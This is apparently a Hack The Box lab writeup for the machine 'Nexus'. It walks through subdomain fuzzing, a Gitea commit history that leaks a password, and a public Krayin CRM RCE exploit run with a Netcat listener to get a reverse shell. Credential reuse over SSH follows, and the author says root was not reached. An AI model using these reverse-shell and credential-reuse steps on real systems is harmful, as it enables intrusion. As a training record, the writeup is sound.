# Nexus - Hack The Box Writeup

## Introduction
**Nexus** is an easy-difficulty Linux machine on Hack The Box. The initial foothold starts with subdomain fuzzing that discovers an exposed **Gitea 1.26.0** service hosted on `git.nexus.htb`. Inspecting a public repository (`krayin-docker-setup`) and analyzing its Git commit history recovers a leaked database password (`N27xh!!2ucY04`). Reusing this password against the internal billing portal at `billing.nexus.htb` grants access as `j.matthew@nexus.htb` to **Krayin CRM 2.2.0**, which is vulnerable to an authenticated Remote Code Execution flaw (CVE-2026-38526), dropping a reverse shell as `www-data`. 

Lateral movement is completed by inspecting the local `.env` configuration file, which reveals updated database credentials (`y27xb3ha!!74GbR`). Reusing these credentials against the local user `jones` allows establishing an interactive SSH session.

> [!NOTE]
> **Assessment Retrospective & Learning Note:**
> The root flag was not captured during this assessment. While initial access as `www-data` and lateral movement to the user `jones` via SSH were successfully accomplished, privilege escalation to `root` proved challenging and exceeded my technical knowledge at the time. Rather than omitting this machine, this writeup is documented with full sincerity and humility. Acknowledging this roadblock provides an authentic record of the methodology used, highlights areas where further study is required, and serves as a stepping stone for continuous improvement in cybersecurity.

### Attack Summary Table
| Metric / Phase | Details |
| --- | --- |
| **Target IP** | `10.129.89.149` |
| **OS** | Linux |
| **Initial Access** | Gitea Git History Credential Leak -> Krayin CRM 2.2.0 Authenticated RCE (CVE-2026-38526) |
| **Lateral Movement** | Local `.env` Credential Hunting -> SSH Credential Reuse (`jones`) |
| **Privilege Escalation** | Incomplete / Not Achieved (Documented with transparency) |

---

## Reconnaissance

### Port Scanning
An initial TCP port scan was performed to identify active services and open ports:

```bash
nmap 10.129.89.149 -n -Pn --min-rate 4000 -vvv -oN ./scans/fast_scan
```

```text
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack
80/tcp open  http    syn-ack
```

A targeted service version and vulnerability scan was then launched:

```bash
nmap 10.129.89.149 -n -Pn --min-rate 4000 -p 22,80 -sCV -vvv -oN ./scans/vuln_scan
```

```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to http://nexus.htb/
```

The scan detected an HTTP redirection to `http://nexus.htb/`. The hostname was added to `/etc/hosts`:

```bash
echo "10.129.89.149 nexus.htb" | sudo tee -a /etc/hosts
```

### Subdomain Fuzzing
After standard directory fuzzing on `http://nexus.htb` yielded no results, virtual host and subdomain enumeration was conducted using `wfuzz`:

```bash
wfuzz -c -f sub-fighter -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://nexus.htb -H "Host: FUZZ.nexus.htb" --hc 403,404,302
```

```text
=====================================================================
ID           Response   Lines    Word       Chars       Payload                      
=====================================================================

000000033:   200        241 L    1366 W     14360 Ch    "git"
```

The scan identified `git.nexus.htb`, which was also mapped to `/etc/hosts`:

```bash
echo "10.129.89.149 git.nexus.htb billing.nexus.htb" | sudo tee -a /etc/hosts
```

---

## Initial Access

### Gitea Credential Leak via Git History
Navigating to `http://git.nexus.htb` revealed a self-hosted **Gitea 1.26.0** portal hosting a public repository: `admin/krayin-docker-setup`.

The repository was cloned locally for analysis:

```bash
git clone http://git.nexus.htb/admin/krayin-docker-setup
```

Inspecting the files showed configuration templates including `docker-compose.yml` and `.env`, referencing a billing portal at `http://billing.nexus.htb`:

```text
APP_URL=http://billing.nexus.htb
DB_HOST=krayin-mysql
DB_PORT=3306
DB_DATABASE=krayin
DB_USERNAME=krayin
```

Examining the commit log revealed past commits containing modified configurations:

```bash
git log --oneline
```

```text
9b817fa (HEAD -> main, origin/main) Upload files to "/"
1615c46 Upload files to "/"
```

Inspecting commit `1615c46` exposed cleartext database credentials that had been committed before being replaced:

```bash
git show 1615c465b74e5d7ad3162873382dd8b3869ca892
```

```diff
+DB_USERNAME=krayin
+DB_PASSWORD=N27xh!!2ucY04
```

Navigating to `http://billing.nexus.htb` displayed the login page for **Krayin CRM**. Testing known employee addresses and usernames against the leaked password yielded a successful login as:
* **Email:** `j.matthew@nexus.htb`
* **Password:** `N27xh!!2ucY04`

### Remote Code Execution in Krayin CRM (CVE-2026-38526)
Accessing the user profile confirmed the running version: **Krayin CRM 2.2.0**.

Researching public exploits for this release revealed **CVE-2026-38526**, an authenticated Remote Code Execution vulnerability:
* **Exploit Reference:** `https://github.com/pawpic/CVE-2026-38526-POC`

> [!TIP]
> When passing passwords containing exclamation marks (`!`) in Bash, enclose the string in single quotes (`'...'`) rather than double quotes to prevent the shell from interpreting `!!` as history expansion.

A local Netcat listener was started:

```bash
nc -nlvp 4444
```

The exploit was executed with single-quoted credentials:

```bash
python3 exploit.py -u http://billing.nexus.htb -e j.matthew@nexus.htb -p 'N27xh!!2ucY04' --lhost 10.10.14.53 --lport 4444
```

This successfully triggered code execution and returned a reverse shell operating under the context of `www-data`.

---

## Lateral Movement

### Configuration File Credential Hunting
With initial access established, local file enumeration in `~/krayin` uncovered the production `.env` configuration file:

```bash
cat ~/krayin/.env | grep DB_
```

```text
DB_CONNECTION=mysql
DB_HOST=127.0.0.1
DB_PORT=3306
DB_DATABASE=krayin
DB_USERNAME=krayin
DB_PASSWORD=y27xb3ha!!74GbR
DB_PREFIX=
```

### SSH Access as Jones
Enumerating local system accounts in `/etc/passwd` identified a regular user account named `jones`:

```bash
cat /etc/passwd | grep "/bin/bash"
```

Testing credential reuse with the production database password (`y27xb3ha!!74GbR`) via SSH succeeded:

```bash
ssh jones@10.129.89.149
# Password: y27xb3ha!!74GbR
```

This established an interactive, stable SSH session as `jones`.

---

## Privilege Escalation (Roadblock & Retrospective)

### Escalation Attempt
From the shell as user `jones`, standard Linux privilege escalation enumeration was performed:
* Checked `sudo -l` to see allowed administrative commands.
* Searched for binaries with SUID/SGID permissions (`find / -perm -4000 2>/dev/null`).
* Inspected cron jobs and scheduled tasks (`/etc/crontab`, `/etc/cron.*`, systemd timers).
* Reviewed running processes (`ps aux`) and internal network listening services (`ss -tulnp`).

### Roadblock & Lessons Learned
Despite reaching the local user `jones` through web exploitation and credential hunting, escalating from `jones` to `root` could not be accomplished during this session. The escalation vector required further investigative depth and specific technique recognition that exceeded my technical capabilities at the time.

Documenting this stopping point reinforces an honest security mindset:
1. **Methodical Progression:** Achieving initial access and user compromise through multi-stage web pivots demonstrates strong enumeration fundamentals.
2. **Target for Study:** The need to expand expertise in complex Linux local privilege escalation scenarios, container escapes, and modern systemd/PAM service configurations.
3. **Future Retesting:** Revisiting this target after focused research to successfully complete the path to root.
